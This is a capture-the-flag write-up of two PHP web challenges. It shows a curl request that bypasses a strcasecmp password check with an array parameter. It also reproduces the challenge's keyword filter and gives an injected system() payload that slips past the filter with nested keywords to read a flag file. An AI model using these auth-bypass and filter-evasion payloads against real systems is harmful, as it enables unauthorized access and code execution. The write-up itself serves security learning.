# Just Not My Type
Author: ZeroDayTea  
Description: I really don't think we're compatible ([Link](http://143.198.184.186:7000/))

----------------------------------------------------
Exploit in strcasecmp function. Payloads: `curl -F "password[]=a" http://143.198.184.186:7000/`  
=>
``` html
<h1>I just don't think we're compatible</h1>

<br />
<b>Warning</b>:  strcasecmp() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>9</b><br />
flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}
<form method="POST">
    Password
    <input type="password" name="password">
    <input type="submit">
</form>
```

flag: `flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}`

# PHat Pottomed Girls  
Author: ZeroDayTea  
Description: Now it's attempt number 3 and this time with a Queen reference! (flag is in the root directory) ([Link](http://143.198.184.186:7001/))  
[phatpottomedgirls.zip](https://2021.killerqueenctf.org/Public/phatpottomedgirls.zip)

-------------------------------------------------------------
All we have to do is creating a payload that can read the flag file in the root directory. Also, this challenge filters these words: 
```php
function filter($originalstring)
{
    $notetoadd = str_replace("<?php", "", $originalstring);
    $notetoadd = str_replace("?>", "", $notetoadd);
    $notetoadd = str_replace("<?", "", $notetoadd);
    $notetoadd = str_replace("flag", "", $notetoadd);

    $notetoadd = str_replace("fopen", "", $notetoadd);
    $notetoadd = str_replace("fread", "", $notetoadd);
    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
    $notetoadd = str_replace("fgets", "", $notetoadd);
    $notetoadd = str_replace("cat", "", $notetoadd);
    $notetoadd = str_replace("strings", "", $notetoadd);
    $notetoadd = str_replace("less", "", $notetoadd);
    $notetoadd = str_replace("more", "", $notetoadd);
    $notetoadd = str_replace("head", "", $notetoadd);
    $notetoadd = str_replace("tail", "", $notetoadd);
    $notetoadd = str_replace("dd", "", $notetoadd);
    $notetoadd = str_replace("cut", "", $notetoadd);
    $notetoadd = str_replace("grep", "", $notetoadd);
    $notetoadd = str_replace("tac", "", $notetoadd);
    $notetoadd = str_replace("awk", "", $notetoadd);
    $notetoadd = str_replace("sed", "", $notetoadd);
    $notetoadd = str_replace("read", "", $notetoadd);
    $notetoadd = str_replace("system", "", $notetoadd);

    return $notetoadd;
}
```
But it just filters 3 times, so when we write this: `strstristrstringsingsngsings`, it will just return `strings`. That's how we bypass the filter.    
First, I used `pwd` to print the working directory, it returned `\var\www\html`. So I just had to go to root directory, use `ls` to see which files are in there, and `strings` it.  
Payload here: `<<<<????php $last_line = syssyssyssystemtemtemtem('cd ..; cd ..; cd ..; strstristrstringsingsngsings flflflflagagagag.php'); echo $last_line; ?>`  

Flag: `flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}`

